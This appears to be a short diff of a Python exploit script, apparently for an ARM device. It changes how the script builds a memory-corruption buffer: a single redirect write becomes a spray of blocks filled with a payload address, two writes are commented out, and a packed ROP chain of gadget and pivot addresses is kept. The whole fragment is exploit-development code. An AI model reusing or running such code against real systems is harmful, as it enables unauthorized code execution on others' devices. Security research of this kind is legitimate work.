@@ -52,13 +52,14 @@ def addr_convert(addr):
 	return c
 	
 
-for i in range(0,size-1,4):
-	temp=d
-	out[i:i+4]=struct.pack("<I",temp)
+temp=addr_convert(PAYLOAD_ADDR)
+for i in range(0,size-0x80,0x80):
+	out[i:i+0x60]=struct.pack("<I",temp)*24
+	out[i+0x60:i+0x80]=struct.pack("<I",0)*8
 	
-write32(redirect_offs, addr_convert(PAYLOAD_ADDR))
+#write32(redirect_offs, addr_convert(PAYLOAD_ADDR))
 
-out[0x1bf70:0x1bf70+0x20]=b"\x00"*0x20
+#out[0x1bf60:0x1bf60+0x20]=b"\x00"*0x20
 
 webstrand=struct.pack("<IIIII", PAYLOAD_ADDR, pop_r4r7pc, pivot_args, pivot, pivot_r3)
 
